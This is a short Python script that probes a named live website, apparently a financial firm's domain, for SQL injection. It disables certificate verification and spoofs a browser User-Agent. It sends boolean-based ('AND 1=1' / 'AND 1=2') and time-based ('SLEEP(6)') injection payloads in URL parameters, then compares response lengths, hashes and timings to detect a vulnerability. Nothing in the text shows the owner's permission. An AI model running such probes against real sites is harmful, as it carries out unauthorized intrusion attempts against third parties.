import urllib.request, hashlib, time, ssl
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36'
def get(u):
    try:
        r=urllib.request.urlopen(urllib.request.Request(u,headers={'User-Agent':UA,'Accept-Encoding':'identity'}),timeout=30,context=ctx)
        b=r.read(); return r.status,len(b),b
    except urllib.error.HTTPError as e:
        b=e.read(); return e.code,len(b),b
    except Exception as e: return 'ERR',0,str(e).encode()

targets=[
 ('ROOT','https://www.infinitycapital.bh/'),
 ('HOME-page2','https://www.infinitycapital.bh/?page=2'),
 ('HOME-TRUE',"https://www.infinitycapital.bh/?page=2'%20AND%201=1--%20-"),
 ('HOME-FALSE',"https://www.infinitycapital.bh/?page=2'%20AND%201=2--%20-"),
 ('HOME-BASE2','https://www.infinitycapital.bh/?page=2'),
 ('HOME-SLEEP',"https://www.infinitycapital.bh/?page=2'%20AND%20SLEEP(6)--%20-"),
 ('HOME-BASE3','https://www.infinitycapital.bh/?page=2'),
 ('CONTACT','https://www.infinitycapital.bh/contact'),
 ('CONTACT-TRUE',"https://www.infinitycapital.bh/contact?cb=1'%20AND%201=1--%20-"),
 ('CONTACT-FALSE',"https://www.infinitycapital.bh/contact?cb=1'%20AND%201=2--%20-"),
 ('CONTACT-BASE','https://www.infinitycapital.bh/contact?cb=1'),
 ('IMGOK','https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75'),
]
out=[]
for lab,u in targets:
    t0=time.time(); st,ln,b=get(u); dt=time.time()-t0
    md5=hashlib.md5(b).hexdigest()[:12]
    print("%-14s %-14s len=%-7s md5=%s t=%.2f" % (lab,st,ln,md5,dt), flush=True)
    out.append((lab,st,ln,md5,round(dt,2)))
    time.sleep(3)
open('/work/w15_verdict.txt','w').write('\n'.join(map(str,out)))
